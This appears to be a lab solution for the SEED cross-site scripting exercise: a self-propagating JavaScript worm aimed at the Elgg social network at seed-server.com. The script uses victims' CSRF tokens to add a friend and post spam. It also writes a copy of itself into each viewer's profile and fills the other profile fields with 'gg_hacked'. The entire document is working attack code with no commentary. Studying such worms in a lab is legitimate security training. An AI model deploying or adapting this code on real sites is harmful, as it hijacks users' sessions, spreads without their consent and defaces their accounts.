<script type="text/javascript" id="worm">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.

	var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + ts + token + token;

	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.seed-server.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();

    sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN

    var stringToPost = `To earn 12 USD/Hour(!), visit now\nhttp://www.seed-server.com/profile/samy`;

	var content = new FormData();
	content.append('__elgg_token', elgg.security.token.__elgg_token);
	content.append('__elgg_ts', elgg.security.token.__elgg_ts);
	content.append('body', stringToPost);

	if(elgg.session.user.guid!=59)
	{
		var xhr = new XMLHttpRequest();
		// Configure the request
		xhr.open('POST', sendurl, true);
		// Send the content object
		xhr.send(content);
	}

    sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN

    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = headerTag + jsCode + tailTag;

	var content = new FormData();
	content.append('__elgg_token', elgg.security.token.__elgg_token);
	content.append('__elgg_ts', elgg.security.token.__elgg_ts);
	content.append('name', elgg.session.user.name);
	content.append('description', wormCode);
	content.append('accesslevel[description]', '1');
	content.append('briefdescription', 'gg_hacked');
	content.append('accesslevel[briefdescription]', '1');
	content.append('location', 'gg_hacked');
	content.append('accesslevel[location]', '1');
	content.append('interests', 'gg_hacked');
	content.append('accesslevel[interests]', '1');
	content.append('skills', 'gg_hacked');
	content.append('accesslevel[skills]', '1');
	content.append('contactemail', 'try34@gmail.com');
	content.append('accesslevel[contactemail]', '1');
	content.append('phone', 'gg_hacked');
	content.append('accesslevel[phone]', '1');
	content.append('mobile', 'gg_hacked');
	content.append('accesslevel[mobile]', '1');
	content.append('website', 'gg_hacked');
	content.append('accesslevel[website]', '1');
	content.append('twitter', 'gg_hacked');
	content.append('accesslevel[twitter]', '1');
	content.append('guid', elgg.session.user.guid);

	if(elgg.session.user.guid!=59)
	{
		var xhr = new XMLHttpRequest();
		// Configure the request
		xhr.open('POST', sendurl, true);
		// Send the content object
		xhr.send(content);
	}


	}
	
</script>
